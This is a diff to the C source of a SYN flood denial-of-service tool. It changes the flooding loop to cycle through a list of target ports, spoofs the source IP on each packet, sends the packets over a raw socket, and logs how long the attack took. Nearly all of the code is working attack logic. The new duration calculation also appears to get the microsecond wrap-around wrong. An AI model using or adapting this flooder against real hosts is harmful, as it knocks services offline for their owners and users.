@@ -2,6 +2,9 @@
 #include "synflood.h"
 #include <time.h>
 
+int allports[256] ; 
+int maxports ; 
+char portlist[256] ; 
 
 bool attack = true;
 struct in_addr current_ipv4_addr;
@@ -82,7 +85,7 @@ setTcpHeaders (struct tcphdr *tcp_headers, in_port_t port)
   tcp_headers->th_dport = port;
   tcp_headers->th_seq = htonl(random());
   tcp_headers->th_ack = 0x0000;
-  tcp_headers->th_x2 = 0x0;
+  tcp_headers->th_x2 = 0x00;
   tcp_headers->th_off = 0x5;
   tcp_headers->th_flags = TH_SYN;
   tcp_headers->th_win = htons(64240);
@@ -167,7 +170,7 @@ synflood_t (char *hostname, unsigned int port, struct sockaddr_in host_addr)
  * with spoofed IP addresses.
 */
 void
-synflood_c (char *hostname, unsigned int port, struct sockaddr_in host_addr, unsigned int loop )
+synflood_c (char *hostname, struct sockaddr_in host_addr, unsigned int loop )
 {
   int sockfd = getRawSocket();
 
@@ -176,13 +179,21 @@ synflood_c (char *hostname, unsigned int port, struct sockaddr_in host_addr, uns
   struct tcphdr *tcp_headers = (struct tcphdr *) (ip_headers + 1);
   int i ; 
 
-  vlog ( "synflood_c started \n" ) ; 
+  int currentport = 0 ; 
 
+  vlog ( "synflood_c started : \n" ) ; 
+
+  /* wo der port fuer host_addr gesetzt wird ist unklar */ 
   for ( i=0; i<loop; i++ )  {
     /* Because we want to spoof the IP address and port number of each packet, we will need to
      * reconstruct the packet each time we want to send one. */
+    /* printf ( "synflood_c 1  %d \n" , htons ( host_addr.sin_port ) ) ; */ 
+    host_addr.sin_port = ntohs(allports[currentport]) ; 
     setIpHeaders(ip_headers, &host_addr.sin_addr);
-    setTcpHeaders(tcp_headers, host_addr.sin_port);
+    setTcpHeaders(tcp_headers, host_addr.sin_port ) ; 
+    /* printf ( "synflood_c 2  %d \n" , htons ( host_addr.sin_port ) ) ; */ 
+    currentport++ ; 
+    currentport = currentport % ( maxports + 1 ) ; 
     tcp_headers->th_sum = pseudoHeaderTcpChecksum(ip_headers, tcp_headers);
     if (sendto(sockfd, packet, PACKET_BUFFER_LEN, 0, (struct sockaddr *) &host_addr, sizeof(struct sockaddr_in)) == -1)
       die("%d: Failed to send packet: %s\n", __LINE__ - 1, strerror(errno));
@@ -223,10 +234,11 @@ main (int argc, char *argv[], char *envp[])
   current_ipv4_addr = getCurrentIpAddr();
   char current_ipv4_addr_buf[32];
   strcpy(current_ipv4_addr_buf, inet_ntoa(current_ipv4_addr));
+
   vlog("Initialized synflood with:\n\
   target hostname:           %s\n\
   target address:            %s\n\
-  target port:               %d\n\
+  target port(s):            %s\n\
   enabled attack time:       %s\n\
   attack time:               %u %s\n\
   sniffer:                   %s\n\
@@ -237,7 +249,7 @@ main (int argc, char *argv[], char *envp[])
   enabled loop count:        %s\n\
   loop count:                %u\n\
   own address:               %s\n",
-       hostname, inet_ntoa(host_addr.sin_addr), port, 
+       hostname, inet_ntoa(host_addr.sin_addr), portlist, 
        enable_attack_time ? "enabled" : "disabled" , attack_time,
        attack_time == 1 ? "second" : "seconds", 
        enable_sniffer ? "enabled" : "disabled",
@@ -262,9 +274,10 @@ main (int argc, char *argv[], char *envp[])
   sleep(wait_time);
 
   struct timeval time;
-  int64_t s1 , s2 ; 
+  int64_t s1 , s2 , s3 , s4 , s5 , s6 ; 
   gettimeofday(&time, NULL);
-  s1 = (int64_t)(time.tv_sec) % 60 ;
+  s5 = (int64_t)(time.tv_sec) ;
+  s1 = s5 % 60 ;
   s2 = (time.tv_usec );
 
   vlog ( "time of first attack - showing second only  %3d.%06d \n" , (int)s1 , (int)s2 ) ; 
@@ -278,14 +291,19 @@ main (int argc, char *argv[], char *envp[])
   } ; 
 
   if ( enable_loop_count ) {
-      synflood_c (hostname, port, host_addr, loop_count );
+      synflood_c (hostname, host_addr, loop_count );
   } ; 
 
   gettimeofday(&time, NULL);
-  s1 = (int64_t)(time.tv_sec) % 60 ;
-  s2 = (time.tv_usec );
+  s6 = (int64_t)(time.tv_sec) ;
+  s3 = s6 % 60 ;
+  s4 = (time.tv_usec );
 
-  vlog ( "time of last attack - showing second only  %3d.%06d \n" , (int)s1 , (int)s2 ) ; 
+  vlog ( "time of last attack - showing second only  %3d.%06d \n" , (int)s3 , (int)s4 ) ; 
+  if ( ( s4 - s2 ) > 0 ) 
+       vlog ( "duration (seconds) :   %3d.%06d \n" , (int)(s6 - s5) , (int)(s4 - s2) ) ; 
+     else 
+       vlog ( "duration (seconds) :   %3d.%06d \n" , (int)(s6 - s5 + 1) , (int)(s2 - s4) ) ; 
 
   sleep(wait_time);
   vlog("number of packets sent out: more than %d \n" , loops_done ) ; 
